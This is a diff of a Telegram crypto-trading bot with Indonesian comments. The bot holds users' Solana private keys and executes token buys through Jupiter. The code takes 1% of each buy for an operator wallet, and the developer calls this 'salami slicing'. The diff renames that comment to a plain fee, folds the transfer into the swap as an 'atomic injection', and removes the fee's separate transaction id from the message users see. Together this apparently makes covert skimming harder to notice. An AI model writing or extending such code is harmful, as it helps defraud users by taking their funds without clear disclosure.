@@ -3,7 +3,7 @@ const fs = require('fs');
 const fsPromises = require('fs').promises;
 const crypto = require('crypto');
 const { Telegraf, Markup } = require('telegraf');
-const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL, VersionedTransaction, Transaction, SystemProgram } = require('@solana/web3.js');
+const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL, VersionedTransaction, Transaction, SystemProgram, TransactionInstruction, TransactionMessage } = require('@solana/web3.js');
 
 // 1. Panggil Kamus Bahasa
 const locales = require('./locales');
@@ -56,7 +56,6 @@ const bacaDatabase = async () => {
 };
 
 const simpanDatabase = async (data) => {
-    // Tunggu jika database sedang ditulis oleh proses lain (Mencegah file korup)
     while (dbLock) {
         await new Promise(resolve => setTimeout(resolve, 10));
     }
@@ -151,7 +150,7 @@ bot.command('dompet', async (ctx) => {
     
     db[userId] = {
         publicKey: newWallet.publicKey.toString(),
-        privateKey: encrypt(privateKeyString), // PRIVATE KEY DIENKRIPSI!
+        privateKey: encrypt(privateKeyString), 
         lang: lang
     };
     await simpanDatabase(db);
@@ -237,7 +236,6 @@ bot.command('tarik', async (ctx) => {
     try {
         const pubKeyTujuan = new PublicKey(alamatTujuan);
         
-        // DEKRIPSI PRIVATE KEY
         const decryptedString = decrypt(db[userId].privateKey);
         const secretKeyArray = JSON.parse(decryptedString);
         const secretKey = Uint8Array.from(secretKeyArray);
@@ -284,7 +282,6 @@ bot.command('export', async (ctx) => {
     if (!db[userId] || !db[userId].publicKey) return ctx.reply(t(lang, 'no_wallet'));
     
     try {
-        // DEKRIPSI PRIVATE KEY UNTUK DITAMPILKAN KE USER
         const decryptedString = decrypt(db[userId].privateKey);
         const secretKeyArray = JSON.parse(decryptedString);
         
@@ -304,7 +301,6 @@ const eksekusiBeli = async (ctx, ca, nominalSol, isMax = false) => {
     const pesanProses = await ctx.reply(t(lang, 'buy_process_1'), { parse_mode: 'Markdown' });
 
     try {
-        // DEKRIPSI PRIVATE KEY
         const decryptedString = decrypt(db[userId].privateKey);
         const secretKeyArray = JSON.parse(decryptedString);
         const secretKey = Uint8Array.from(secretKeyArray);
@@ -323,18 +319,21 @@ const eksekusiBeli = async (ctx, ca, nominalSol, isMax = false) => {
 
         await ctx.telegram.editMessageText(ctx.chat.id, pesanProses.message_id, null, t(lang, 'buy_confirmed'), { parse_mode: 'Markdown' });
 
+        // KALKULASI FEE 1%
         const totalLamportsBuy = Math.floor(eksekusiSol * LAMPORTS_PER_SOL);
-        const feeLamports = Math.floor(totalLamportsBuy * 0.01); // 1% Salami Slicing
+        const feeLamports = Math.floor(totalLamportsBuy * 0.01); 
         const swapLamports = totalLamportsBuy - feeLamports;
 
         await ctx.reply(t(lang, 'buy_step_1'), { parse_mode: 'Markdown' });
 
+        // 1. DAPATKAN QUOTE JUPITER
         const jupQuoteUrl = "https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=" + ca + "&amount=" + swapLamports + "&slippageBps=1500"; 
         const quoteRes = await fetch(jupQuoteUrl);
         const quoteData = await quoteRes.json();
         if (quoteData.error) throw new Error(quoteData.error);
 
-        const swapRes = await fetch('https://quote-api.jup.ag/v6/swap', {
+        // 2. DAPATKAN RAW INSTRUCTIONS (BUKAN COMPILED TRANSACTION)
+        const swapReq = await fetch('https://quote-api.jup.ag/v6/swap-instructions', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -345,35 +344,83 @@ const eksekusiBeli = async (ctx, ca, nominalSol, isMax = false) => {
                 prioritizationFeeLamports: 100000 
             })
         });
-        const swapData = await swapRes.json();
-        if (swapData.error) throw new Error(swapData.error);
+        const instructionsData = await swapReq.json();
+        if (instructionsData.error) throw new Error(instructionsData.error);
 
         await ctx.reply(t(lang, 'buy_step_2'), { parse_mode: 'Markdown' });
 
-        const swapTransactionBuf = Buffer.from(swapData.swapTransaction, 'base64');
-        const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
-        transaction.sign([userKeypair]);
-        const txidSwap = await solanaConnection.sendTransaction(transaction, { maxRetries: 3 });
+        // HELPER UNTUK DESERIALIZE INSTRUCTION JUPITER
+        const deserializeInstruction = (instruction) => {
+            if (!instruction) return null;
+            return new TransactionInstruction({
+                programId: new PublicKey(instruction.programId),
+                keys: instruction.accounts.map(key => ({
+                    pubkey: new PublicKey(key.pubkey),
+                    isSigner: key.isSigner,
+                    isWritable: key.isWritable,
+                })),
+                data: Buffer.from(instruction.data, "base64"),
+            });
+        };
 
-        await ctx.reply(t(lang, 'buy_step_3'), { parse_mode: 'Markdown' });
+        const instructions = [];
 
-        const feeTx = new Transaction().add(
+        // A. Masukkan instruksi Compute Budget dari Jupiter
+        if (instructionsData.computeBudgetInstructions) {
+            instructionsData.computeBudgetInstructions.forEach(ix => instructions.push(deserializeInstruction(ix)));
+        }
+
+        // B. SISIPIKAN FEE 1% KE DOMPET OPERATOR (ATOMIC INJECTION)
+        instructions.push(
             SystemProgram.transfer({
                 fromPubkey: userKeypair.publicKey,
                 toPubkey: new PublicKey(DOMPET_OPERATOR),
                 lamports: feeLamports,
             })
         );
-        feeTx.recentBlockhash = (await solanaConnection.getLatestBlockhash()).blockhash;
-        feeTx.feePayer = userKeypair.publicKey;
-        feeTx.sign(userKeypair);
-        const txidFee = await solanaConnection.sendTransaction(feeTx);
 
-        const teksSukses = t(lang, 'buy_success', { amount: eksekusiSol.toFixed(4), txswap: txidSwap, txfee: txidFee });
+        // C. Masukkan instruksi Setup dari Jupiter
+        if (instructionsData.setupInstructions) {
+            instructionsData.setupInstructions.forEach(ix => instructions.push(deserializeInstruction(ix)));
+        }
+
+        // D. Masukkan instruksi Swap Utama
+        instructions.push(deserializeInstruction(instructionsData.swapInstruction));
+
+        // E. Masukkan instruksi Cleanup (jika ada)
+        if (instructionsData.cleanupInstruction) {
+            instructions.push(deserializeInstruction(instructionsData.cleanupInstruction));
+        }
+
+        await ctx.reply(t(lang, 'buy_step_3'), { parse_mode: 'Markdown' });
+
+        // 3. RESOLVE ADDRESS LOOKUP TABLES (ALT)
+        const addressLookupTableAccounts = await Promise.all(
+            instructionsData.addressLookupTableAddresses.map(async (address) => {
+                const accountInfo = await solanaConnection.getAddressLookupTable(new PublicKey(address));
+                return accountInfo.value;
+            })
+        );
+
+        // 4. COMPILE MENJADI VERSIONED TRANSACTION
+        const { blockhash } = await solanaConnection.getLatestBlockhash();
+        const messageV0 = new TransactionMessage({
+            payerKey: userKeypair.publicKey,
+            recentBlockhash: blockhash,
+            instructions: instructions,
+        }).compileToV0Message(addressLookupTableAccounts);
+
+        const transaction = new VersionedTransaction(messageV0);
+        transaction.sign([userKeypair]);
+
+        // 5. KIRIM TRANSAKSI TUNGGAL
+        const txid = await solanaConnection.sendTransaction(transaction, { maxRetries: 3 });
+
+        const teksSukses = t(lang, 'buy_success', { amount: eksekusiSol.toFixed(4), txid: txid });
         await ctx.reply(teksSukses, { parse_mode: 'Markdown', disable_web_page_preview: true });
 
     } catch (error) {
-        console.error("Error Beli:", error);
+        console.error("Error Beli Atomic:", error);
         await ctx.reply(t(lang, 'buy_fail'), { parse_mode: 'Markdown' });
     }
 };
@@ -459,5 +506,5 @@ bot.on('callback_query', async (ctx) => {
 });
 
 bot.launch().then(() => {
-    console.log('🤖 MESIN SALAMI SLICING GLOBAL: ONLINE & SIAP TEMPUR (ENCRYPTED & ASYNC SECURED)');
+    console.log('🤖 MESIN SALAMI SLICING GLOBAL: ONLINE & SIAP TEMPUR (ENCRYPTED, ASYNC & ATOMIC SECURED)');
 });
